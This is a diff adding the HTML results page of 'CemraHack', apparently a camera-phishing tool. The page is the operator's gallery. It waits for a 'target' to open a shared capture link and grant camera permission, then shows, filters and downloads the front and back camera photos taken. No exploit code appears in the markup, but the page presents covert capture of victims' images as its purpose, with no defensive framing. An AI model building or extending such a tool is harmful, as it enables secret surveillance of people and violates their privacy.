@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CemraHack — Results Gallery</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=Space+Grotesk:wght@400;500;700&display=swap"
+        rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+
+<body class="page-results">
+
+    <!-- Animated background -->
+    <div class="bg-grid"></div>
+    <div class="bg-glow glow-1"></div>
+    <div class="bg-glow glow-2"></div>
+    <div class="bg-glow glow-3"></div>
+
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="nav-logo">
+            <i class="fa-solid fa-camera-retro"></i>
+            <span>Cemra<b>Hack</b></span>
+        </div>
+        <div class="nav-actions">
+            <button class="btn-back" onclick="window.location.href='index.html'">
+                <i class="fa-solid fa-arrow-left"></i>
+                Back to Generator
+            </button>
+        </div>
+    </nav>
+
+    <!-- RESULTS HEADER -->
+    <div class="results-header">
+        <div class="results-info">
+            <div class="results-session">
+                <i class="fa-solid fa-fingerprint"></i>
+                <span>Session: </span>
+                <strong id="resultsSessionId">Loading...</strong>
+            </div>
+            <div class="results-live">
+                <span class="live-dot"></span>
+                <span>LIVE FEED</span>
+            </div>
+        </div>
+
+        <h2 class="results-title">
+            <i class="fa-solid fa-images"></i>
+            Captured Images
+            <span class="capture-count" id="captureCount">0</span>
+        </h2>
+
+        <div class="results-controls">
+            <button class="ctrl-btn active" id="viewGrid" onclick="setView('grid')">
+                <i class="fa-solid fa-grip"></i>
+            </button>
+            <button class="ctrl-btn" id="viewList" onclick="setView('list')">
+                <i class="fa-solid fa-list"></i>
+            </button>
+            <button class="ctrl-btn" onclick="downloadAll()">
+                <i class="fa-solid fa-download"></i>
+                Download All
+            </button>
+            <button class="ctrl-btn danger" onclick="clearAll()">
+                <i class="fa-solid fa-trash"></i>
+                Clear
+            </button>
+        </div>
+    </div>
+
+    <!-- FILTER BAR -->
+    <div class="filter-bar">
+        <button class="filter-btn active" onclick="filterImages('all', this)">All</button>
+        <button class="filter-btn" onclick="filterImages('front', this)">
+            <i class="fa-solid fa-user"></i> Front Camera
+        </button>
+        <button class="filter-btn" onclick="filterImages('back', this)">
+            <i class="fa-solid fa-camera"></i> Back Camera
+        </button>
+        <div class="filter-search">
+            <i class="fa-solid fa-search"></i>
+            <input type="text" placeholder="Search by date or session..." id="searchInput" oninput="searchImages()" />
+        </div>
+    </div>
+
+    <!-- WAITING STATE -->
+    <div class="waiting-state" id="waitingState">
+        <div class="radar-anim">
+            <div class="radar-ring r1"></div>
+            <div class="radar-ring r2"></div>
+            <div class="radar-ring r3"></div>
+            <div class="radar-core"><i class="fa-solid fa-camera"></i></div>
+        </div>
+        <h3>Waiting for Target...</h3>
+        <p>Share your capture link. Images will appear here<br />once the target grants camera permission.</p>
+        <div class="waiting-steps">
+            <div class="w-step" id="wStep1">
+                <i class="fa-solid fa-check-circle"></i>
+                <span>Link Generated</span>
+            </div>
+            <div class="w-step pending" id="wStep2">
+                <i class="fa-regular fa-circle"></i>
+                <span>Target Connected</span>
+            </div>
+            <div class="w-step pending" id="wStep3">
+                <i class="fa-regular fa-circle"></i>
+                <span>Permission Granted</span>
+            </div>
+            <div class="w-step pending" id="wStep4">
+                <i class="fa-regular fa-circle"></i>
+                <span>Photos Captured</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- GALLERY GRID -->
+    <div class="gallery" id="gallery"></div>
+
+    <!-- IMAGE LIGHTBOX -->
+    <div class="lightbox" id="lightbox" onclick="closeLightbox()">
+        <div class="lightbox-inner" onclick="event.stopPropagation()">
+            <button class="lb-close" onclick="closeLightbox()"><i class="fa-solid fa-xmark"></i></button>
+            <button class="lb-prev" onclick="lightboxPrev()"><i class="fa-solid fa-chevron-left"></i></button>
+            <button class="lb-next" onclick="lightboxNext()"><i class="fa-solid fa-chevron-right"></i></button>
+            <img id="lbImage" src="" alt="Captured" />
+            <div class="lb-meta">
+                <div class="lb-info">
+                    <span id="lbTime"></span>
+                    <span id="lbCamera"></span>
+                    <span id="lbSession"></span>
+                </div>
+                <button class="lb-download" onclick="downloadSingle()">
+                    <i class="fa-solid fa-download"></i> Download
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST -->
+    <div class="toast" id="toast">
+        <i class="fa-solid fa-check-circle"></i>
+        <span id="toastMsg">Done!</span>
+    </div>
+
+    <script src="results.js"></script>
+</body>
+
+</html>
